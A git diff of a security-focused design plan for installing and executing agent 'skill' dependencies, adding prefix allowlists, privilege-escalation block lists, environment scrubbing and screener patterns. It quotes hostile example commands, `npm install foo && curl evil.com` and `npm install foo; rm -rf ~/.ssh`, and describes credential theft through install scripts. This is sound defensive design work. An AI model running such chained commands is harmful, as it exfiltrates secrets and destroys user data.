@@ -1,7 +1,7 @@
 # Skills Import, Installation & Execution — Architecture & Implementation Plan
 
 **Date:** 2026-03-03
-**Status:** Draft (rev 2 — incorporates security review feedback)
+**Status:** Draft (rev 4 — incorporates third security review feedback)
 **Scope:** Replace structured `kind`/`package` installer taxonomy with raw `run` commands; define the full install lifecycle, host/agent boundary, and IPC commands.
 
 ---
@@ -17,6 +17,9 @@ AX skills currently use a structured `kind`/`package` taxonomy for installation 
 - **Inspect→execute integrity.** Execute requests are bound to the inspected content via a SHA-256 token, closing the TOCTOU window between inspect and execute.
 - **Async execution.** Install commands run via async `child_process.execFile`, never `execSync`, to avoid blocking the host event loop.
 - **Cross-platform binary lookup.** Binary existence checks use Node's `child_process.execFile` with platform-appropriate commands (`where` on Windows, `command -v` on POSIX), not bare `which`.
+- **Environment variable scrubbing.** Install commands run with a minimal environment (`PATH`, `HOME`, `USER`, `TMPDIR`, `LANG`), not the full host `process.env`. Prevents credential exfiltration via malicious install scripts.
+- **Command prefix allowlisting.** The `run` field must start with a known package manager binary (`npm`, `brew`, `pip`, `cargo`, etc.). Privilege escalation commands (`sudo`, `su`, `doas`) are hard-rejected.
+- **Concurrency limiting.** The host enforces a per-agent semaphore on concurrent install executions (default: 1) to prevent resource exhaustion from rapid-fire install requests.
 
 ---
 
@@ -80,7 +83,10 @@ Each step:
 │                                                              │
 │  - Parses skill install steps from SKILL.md                  │
 │  - Resolves `bin` fields via safe PATH lookup (no shell)     │
+│  - Validates `run` prefix against package manager allowlist  │
 │  - Executes approved `run` commands (async, has network)     │
+│  - Scrubs process.env — minimal env only (PATH, HOME, etc.) │
+│  - Enforces concurrency limit (1 install at a time/agent)   │
 │  - Validates inspectToken matches current skill content      │
 │  - Persists install state (scoped by agentId + skill name)   │
 │  - Audits every install action                               │
@@ -166,9 +172,14 @@ Response:
 }
 ```
 
-**Agent presents to user**:
-> Skill 'gog' needs a dependency installed:
-> 1. **Install gog via Homebrew** — `brew install steipete/tap/gogcli`
+**Agent presents to user** (UI/UX security: the label and `run` command are visually separated — the command is shown in full monospace, never truncated, so the user can spot appended commands like `&& curl evil.com`):
+
+> Skill **gog** needs a dependency installed:
+>
+> **Step 1: Install gog via Homebrew**
+> ```
+> brew install steipete/tap/gogcli
+> ```
 >
 > Approve?
 
@@ -217,22 +228,119 @@ Key properties:
 - **Input validated.** The `name` regex rejects paths (`/`, `\`), shell operators (`|`, `;`, `$`), etc.
 - **Cross-platform.** `command -v` on POSIX (more portable than `which`), `where` on Windows.
 - **Timeout.** 5-second cap prevents hanging on broken PATH entries.
+- **Global binaries only.** The strict regex intentionally rejects paths like `./node_modules/.bin/prettier`. The `bin` field only verifies binaries accessible via the system `PATH`. This is a deliberate security trade-off — skill authors must document this constraint: if a tool installs to a local project directory, the `bin` check will not find it, and the step will remain in `needed` status. Skill authors should either omit `bin` for locally-installed tools or instruct users to add the local bin directory to their `PATH`.
 
-### 4.2 Async Command Execution
+### 4.2 Command Prefix Allowlisting
+
+Before any command reaches the execution phase, the host validates that the `run` field starts with a known package manager binary. This is a defense-in-depth measure — even though the user approves each command, restricting the command prefix limits the blast radius of social engineering or obfuscated payloads.
+
+```typescript
+const ALLOWED_PREFIXES = /^(npm|npx|brew|pip|pip3|uv|cargo|go|apt|apt-get|apk|gem|composer|dotnet)\b/;
+const BLOCKED_PREFIXES = /^(sudo|su|doas|pkexec)\b/;
+
+function validateRunCommand(cmd: string): { valid: boolean; reason?: string } {
+  const trimmed = cmd.trim();
+
+  // Hard-reject privilege escalation
+  if (BLOCKED_PREFIXES.test(trimmed)) {
+    return { valid: false, reason: `Privilege escalation command rejected: ${trimmed.split(/\s/)[0]}` };
+  }
+
+  // Require known package manager prefix
+  if (!ALLOWED_PREFIXES.test(trimmed)) {
+    return { valid: false, reason: `Command must start with a known package manager (npm, brew, pip, cargo, etc.)` };
+  }
+
+  return { valid: true };
+}
+```
+
+Key properties:
+- **Allowlist, not blocklist.** Only known package manager binaries are permitted. Unknown commands are rejected by default.
+- **Privilege escalation hard-reject.** `sudo`, `su`, `doas`, and `pkexec` are blocked unconditionally — the agent should never prompt the host user for root credentials.
+- **Applied at both phases.** The host validates the prefix during inspect (so the agent can report invalid steps) and again during execute (defense in depth).
+
+### 4.3 Environment Variable Scrubbing
+
+Install commands run with a **minimal environment**, not the full host `process.env`. This prevents credential exfiltration — a malicious `npm preinstall` script or Homebrew formula could otherwise read `AWS_ACCESS_KEY_ID`, `NPM_TOKEN`, `SSH_AUTH_SOCK`, or similar secrets from the inherited environment.
+
+```typescript
+function buildScrubedEnv(): NodeJS.ProcessEnv {
+  const { PATH, HOME, USER, TMPDIR, LANG, SHELL } = process.env;
+  return {
+    PATH,
+    HOME,
+    USER,
+    TMPDIR: TMPDIR ?? '/tmp',
+    LANG: LANG ?? 'en_US.UTF-8',
+    SHELL: SHELL ?? '/bin/sh',
+    // npm/node need this to find the global prefix
+    ...(process.env.NODE_PATH ? { NODE_PATH: process.env.NODE_PATH } : {}),
+    // Homebrew needs this on macOS
+    ...(process.env.HOMEBREW_PREFIX ? { HOMEBREW_PREFIX: process.env.HOMEBREW_PREFIX } : {}),
+  };
+}
+```
+
+Key properties:
+- **Only functional variables.** `PATH`, `HOME`, `USER`, `TMPDIR`, `LANG`, `SHELL` — the minimum set for package managers to function.
+- **Selective passthrough.** `NODE_PATH` and `HOMEBREW_PREFIX` are conditionally included only if set, since specific package managers need them.
+- **No credentials.** `AWS_*`, `NPM_TOKEN`, `GITHUB_TOKEN`, `SSH_AUTH_SOCK`, `DOCKER_*`, etc. are all excluded by omission.
+
+### 4.4 Async Command Execution
 
 Install commands (`run` fields) execute via `child_process.execFile('/bin/sh', ['-c', cmd])` wrapped in a promise, **not `execSync`**. This prevents blocking the host event loop — a single 5-minute install step with `execSync` would stall all IPC handling, heartbeats, and concurrent agent requests.
 
 ```typescript
 async function executeInstallStep(cmd: string, timeoutMs = 300_000): Promise<ExecResult> {
+  const scrubbedEnv = buildScrubedEnv();
+  const shell = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';
+  const shellArgs = process.platform === 'win32' ? ['/c', cmd] : ['-c', cmd];
+
   const { stdout, stderr } = await execFileAsync(
-    '/bin/sh', ['-c', cmd],
-    { timeout: timeoutMs, maxBuffer: 10 * 1024 * 1024 }
+    shell, shellArgs,
+    {
+      timeout: timeoutMs,
+      maxBuffer: 10 * 1024 * 1024,
+      env: scrubbedEnv,  // Minimal env — no credential leakage
+    }
   );
   return { stdout, stderr, exitCode: 0 };
 }
 ```
 
-On Windows, use `cmd.exe /c` instead of `/bin/sh -c`.
+### 4.5 Concurrency Limiting
+
+The host enforces a per-agent semaphore on concurrent install executions to prevent resource exhaustion. Without this, a compromised or buggy agent could rapid-fire 50 `execute` requests for heavy installations (e.g., compiling large Rust binaries via `cargo`), exhausting CPU and memory.
+
+```typescript
+class InstallSemaphore {
+  private readonly maxConcurrent: number;
+  private readonly active = new Map<string, number>();  // agentId → count
+
+  constructor(maxConcurrent = 1) {
+    this.maxConcurrent = maxConcurrent;
+  }
+
+  tryAcquire(agentId: string): boolean {
+    const current = this.active.get(agentId) ?? 0;
+    if (current >= this.maxConcurrent) return false;
+    this.active.set(agentId, current + 1);
+    return true;
+  }
+
+  release(agentId: string): void {
+    const current = this.active.get(agentId) ?? 0;
+    if (current <= 1) this.active.delete(agentId);
+    else this.active.set(agentId, current - 1);
+  }
+}
+```
+
+Key properties:
+- **Per-agent scoping.** Each agent gets its own concurrency slot(s). One agent's heavy install doesn't block another agent's work.
+- **Default: 1 concurrent install per agent.** Sequential by default — the safest option. Can be increased if needed.
+- **Fail-fast on limit.** When the semaphore is full, the handler immediately returns a `rate_limited` status with a human-readable message, rather than queuing silently. The agent can retry after the current install completes.
 
 ---
 
@@ -356,15 +464,18 @@ Update install steps mapping from `kind`/`package`/`bins` to `run`/`label`/`bin`
 
 Add `skill_install` and `skill_install_status` to `createSkillsHandlers()`.
 
-- **`skill_install` inspect phase:** Parse skill, filter by OS, resolve `bin` fields via safe `binExists()` (§4.1), compute `inspectToken` (SHA-256 of canonical step JSON), return step statuses + token.
+- **`skill_install` inspect phase:** Parse skill, filter by OS, validate `run` prefixes against allowlist (§4.2), resolve `bin` fields via safe `binExists()` (§4.1), compute `inspectToken` (SHA-256 of canonical step JSON), return step statuses + token. Steps with invalid `run` prefixes are flagged as `invalid` in the response so the agent can report them.
 - **`skill_install` execute phase:**
-  1. Re-parse skill, recompute content hash
-  2. **Reject if `inspectToken` doesn't match** (skill changed since inspect — TOCTOU defense)
-  3. Validate step index is in range
-  4. Re-check `bin` via safe PATH lookup
-  5. Execute command via **async `child_process.execFile`** with timeout (§4.2) — never `execSync`
-  6. Verify with post-check (bin lookup)
-  7. Persist state, audit log
+  1. **Acquire semaphore** (§4.5) — reject with `rate_limited` if at capacity
+  2. Re-parse skill, recompute content hash
+  3. **Reject if `inspectToken` doesn't match** (skill changed since inspect — TOCTOU defense)
+  4. Validate step index is in range
+  5. **Re-validate `run` prefix** against allowlist (§4.2) — defense in depth
+  6. Re-check `bin` via safe PATH lookup — if found now, return `already_satisfied`, skip
+  7. Execute command via **async `child_process.execFile`** with scrubbed env (§4.3, §4.4) — never `execSync`
+  8. **Release semaphore** (in `finally` block — always releases even on error/timeout)
+  9. Verify with post-check (bin lookup)
+  10. Persist state, audit log
 - **`skill_install_status`:** Read persisted state from `~/.ax/data/skill-install-state/<agentId>/<skill-hash>.json`
 
 ### Install state path safety
@@ -421,12 +532,17 @@ install_status: 'skill_install_status',
 
 - **No pre-approval execution.** The inspect phase performs only safe PATH lookups via `binExists()` (§4.1) — no arbitrary shell commands. The `bin` field is validated against `/^[a-zA-Z0-9_.-]+$/` before lookup. This closes the P0 approval gate bypass from the original design where `check` commands ran before approval.
 - **Inspect→execute integrity (inspectToken).** Execute requests must present the `inspectToken` from their preceding inspect call. The host re-hashes the current skill content and rejects mismatches. This closes the TOCTOU gap where skill content could be modified between inspect and execute.
-- **Async execution.** Install commands run via async `child_process.execFile`, not `execSync`, preventing a single slow install from blocking the host event loop, IPC handling, and heartbeats.
+- **Command prefix allowlisting (§4.2).** The `run` field must start with a known package manager binary (`npm`, `brew`, `pip`, `cargo`, etc.). Validated at both inspect and execute phases. Unknown commands are rejected by default (allowlist, not blocklist).
+- **Privilege escalation hard-reject (§4.2).** `sudo`, `su`, `doas`, and `pkexec` are unconditionally blocked. The agent should never prompt the host user for root credentials via the terminal.
+- **Environment variable scrubbing (§4.3).** Install commands run with a minimal environment (`PATH`, `HOME`, `USER`, `TMPDIR`, `LANG`, `SHELL`), not the full host `process.env`. Prevents credential exfiltration via malicious install scripts (e.g., `npm preinstall` reading `AWS_ACCESS_KEY_ID`, `NPM_TOKEN`, or `SSH_AUTH_SOCK`).
+- **Async execution (§4.4).** Install commands run via async `child_process.execFile`, not `execSync`, preventing a single slow install from blocking the host event loop, IPC handling, and heartbeats.
+- **Concurrency limiting (§4.5).** Per-agent semaphore (default: 1 concurrent install) prevents resource exhaustion from rapid-fire install requests. Semaphore releases in `finally` block to prevent leaks on error/timeout.
 - **Taint budget**: Add `skill_install` to sensitive actions in `src/host/taint-budget.ts`. Tainted sessions can't trigger installs.
-- **Screening**: Extend screener to scan `run` fields for `curl | bash`, backtick subshells, `$(...)` patterns. Same hard-reject patterns as skill body.
-- **Audit**: Every phase logged — `skill_install_inspect`, `skill_install_execute`, `skill_install_step`, `skill_install_skip`.
+- **Screening**: Extend screener to scan `run` fields for `curl | bash`, backtick subshells, `$(...)`, command chaining operators (`;`, `&&`, `||`), and I/O redirection (`>`, `>>`, `<`). Same hard-reject patterns as skill body.
+- **Audit**: Every phase logged — `skill_install_inspect`, `skill_install_execute`, `skill_install_step`, `skill_install_skip`, `skill_install_rate_limited`.
 - **No agent-constructed commands**: Agent passes skill name + step index + inspectToken, never the command itself. Commands come from parsed SKILL.md on the host side.
 - **Path-safe state persistence.** Install state files use `safePath()` and hash-derived filenames, scoped by `agentId`. No raw skill names in file paths.
+- **UI/UX security.** The `label` and `run` command are visually separated in the approval prompt. The `run` command is shown in full monospace, never truncated, so the user can spot appended commands (e.g., `npm install foo && curl evil.com`).
 
 ---
 
@@ -438,6 +554,7 @@ install_status: 'skill_install_status',
 | `src/utils/skill-format-parser.ts` | Replace `parseInstallSpecs` → `parseInstallSteps` with backward-compat |
 | `src/utils/manifest-generator.ts` | Update install steps mapping |
 | `src/utils/bin-exists.ts` | **New file** — cross-platform safe binary lookup (`binExists()`) |
+| `src/utils/install-validator.ts` | **New file** — `validateRunCommand()` prefix allowlist, `buildScrubedEnv()`, `InstallSemaphore` |
 | `src/ipc-schemas.ts` | Add `SkillInstallSchema` (with `inspectToken`), `SkillInstallStatusSchema` |
 | `src/host/ipc-handlers/skills.ts` | Add `skill_install` (async, with inspectToken validation) and `skill_install_status` handlers |
 | `src/host/ipc-server.ts` | Register new `skill_install` and `skill_install_status` in dispatch map |
@@ -448,6 +565,7 @@ install_status: 'skill_install_status',
 | `tests/utils/skill-format-parser.test.ts` | Update for new format + backward-compat tests |
 | `tests/utils/manifest-generator.test.ts` | Update for new manifest shape |
 | `tests/utils/bin-exists.test.ts` | **New file** — tests for cross-platform binary lookup |
+| `tests/utils/install-validator.test.ts` | **New file** — tests for prefix allowlist, env scrubbing, semaphore |
 | `tests/host/ipc-handlers/skills-install.test.ts` | **New file** — install handler: inspect, execute, token validation, async exec |
 | `tests/ipc-schemas.test.ts` | Add validation tests for `SkillInstallSchema` (inspectToken, stepIndex constraints) |
 | `tests/host/ipc-server.test.ts` | Verify `skill_install` / `skill_install_status` dispatch registration |
@@ -458,15 +576,16 @@ install_status: 'skill_install_status',
 
 1. Types (`types.ts`) — `SkillInstallStep`, `SkillInstallState`, `SkillInstallInspectResponse`
 2. `bin-exists.ts` utility + tests — cross-platform binary lookup, no shell
-3. Parser (`skill-format-parser.ts`) + tests — `bin` field, backward-compat
-4. Manifest generator (`manifest-generator.ts`) + tests
-5. IPC schemas (`ipc-schemas.ts`) + schema tests — `inspectToken` field
-6. Handler (`skills.ts`) + tests — async exec, inspectToken validation, safe state paths
-7. IPC server dispatch registration (`ipc-server.ts`) + dispatch tests
-8. Tool catalog (`tool-catalog.ts`) — `inspectToken` in install operation
-9. Taint budget (`taint-budget.ts`)
-10. `skill_read` / `skill_list` warning attachment (`git.ts`, prompt modules)
-11. Full test suite pass
+3. `install-validator.ts` utility + tests — command prefix allowlist, env scrubbing, concurrency semaphore
+4. Parser (`skill-format-parser.ts`) + tests — `bin` field, backward-compat
+5. Manifest generator (`manifest-generator.ts`) + tests
+6. IPC schemas (`ipc-schemas.ts`) + schema tests — `inspectToken` field
+7. Handler (`skills.ts`) + tests — async exec, inspectToken validation, safe state paths, semaphore acquire/release, env scrubbing
+8. IPC server dispatch registration (`ipc-server.ts`) + dispatch tests
+9. Tool catalog (`tool-catalog.ts`) — `inspectToken` in install operation
+10. Taint budget (`taint-budget.ts`)
+11. `skill_read` / `skill_list` warning attachment (`git.ts`, prompt modules)
+12. Full test suite pass
 
 ---
 
@@ -475,23 +594,34 @@ install_status: 'skill_install_status',
 1. `npm test` — all existing tests pass (parser backward-compat ensures no breakage)
 2. New parser tests: both old `kind`/`package` format and new `run` format parse correctly
 3. New `binExists` tests: validates regex rejection of shell metacharacters, cross-platform command selection
-4. New handler tests: inspect returns correct step statuses + inspectToken, execute validates token, async execution doesn't block, safe state path derivation
-5. New IPC schema tests: `inspectToken` required for execute phase, rejected for inspect phase
-6. New dispatch tests: `skill_install` and `skill_install_status` correctly registered in IPC server
-7. Manual test: import a skill with install steps, call `skill_install` inspect, verify inspectToken in response, call execute with token, verify end-to-end
+4. New `install-validator` tests: prefix allowlist accepts valid package managers, rejects unknown commands, hard-rejects `sudo`/`su`/`doas`/`pkexec`, env scrubbing excludes credential vars, semaphore enforces per-agent limits
+5. New handler tests: inspect returns correct step statuses + inspectToken, execute validates token, async execution doesn't block, safe state path derivation, semaphore acquire/release around execution, scrubbed env passed to `execFile`
+6. New IPC schema tests: `inspectToken` required for execute phase, rejected for inspect phase
+7. New dispatch tests: `skill_install` and `skill_install_status` correctly registered in IPC server
+8. Manual test: import a skill with install steps, call `skill_install` inspect, verify inspectToken in response, call execute with token, verify end-to-end
 
 ---
 
 ## 15. Resolved Review Feedback
 
-This revision addresses the following review findings (from `skill-install-feedback.md`):
+### Rev 3 — Second security review (from `skill-install-feedback.md`)
 
 | # | Severity | Finding | Resolution |
 |---|----------|---------|------------|
 | 1 | **P0** | `check` commands execute pre-approval | Replaced `check` with declarative `bin` field; host resolves via safe PATH lookup, no shell (§1, §4.1) |
 | 2 | **P1** | TOCTOU gap between inspect and execute | Added `inspectToken` (SHA-256 content hash); execute rejects mismatches (§3, §4, §11) |
-| 3 | **P1** | `execSync` blocks host event loop | Replaced with async `child_process.execFile` (§4.2, §9) |
+| 3 | **P1** | `execSync` blocks host event loop | Replaced with async `child_process.execFile` (§4.4, §9) |
 | 4 | **P1** | Windows: `which` doesn't exist | Cross-platform: `command -v` (POSIX) / `where` (Windows) via `execFile` (§4.1) |
 | 5 | **P1** | Install state path unsafe/unscoped | `safePath()` + hash-derived filenames, scoped by `agentId` (§9) |
 | 6 | **P2** | `requires.bins` warnings don't surface | Warnings attached to both `skill_list` and `skill_read` responses (§5) |
 | 7 | **P2** | File/test impact underestimated | Added 7 files to change list: `bin-exists.ts`, `ipc-server.ts`, `git.ts`, prompt modules, and 4 test files (§12) |
+
+### Rev 4 — Third security review
+
+| # | Severity | Finding | Resolution |
+|---|----------|---------|------------|
+| 8 | **P1** | Token exfiltration via inherited `process.env` — malicious install scripts can read `AWS_ACCESS_KEY_ID`, `NPM_TOKEN`, `SSH_AUTH_SOCK` | Added env scrubbing (§4.3): install commands run with minimal env (`PATH`, `HOME`, `USER`, `TMPDIR`, `LANG`, `SHELL`). Code example updated in §4.4 to pass `env: scrubbedEnv`. |
+| 9 | **P1** | Command chaining & privilege escalation via `run` field (`npm install foo; rm -rf ~/.ssh`, `sudo brew install`) | Added command prefix allowlisting (§4.2): `run` must start with known package manager binary (allowlist regex). `sudo`/`su`/`doas`/`pkexec` hard-rejected. Validated at both inspect and execute phases. |
+| 10 | **P1** | Resource exhaustion via rapid-fire install requests (50 concurrent `cargo install` compilations) | Added concurrency semaphore (§4.5): per-agent limit (default: 1), fail-fast `rate_limited` response, `finally`-block release. Handler updated (§9) to acquire/release around execution. |
+| 11 | **P2** | `bin` regex rejects local installs (`./node_modules/.bin/prettier`) — usability impact | Documented as intentional constraint in §4.1. Skill authors must use global installs or omit `bin` for locally-installed tools. |
+| 12 | **P2** | UI/UX: user is the final firewall — `label` and `run` must be visually separated, command never truncated | Documented in §4 (agent presentation) and §11 (security). `run` shown in full monospace block, `label` shown separately. |
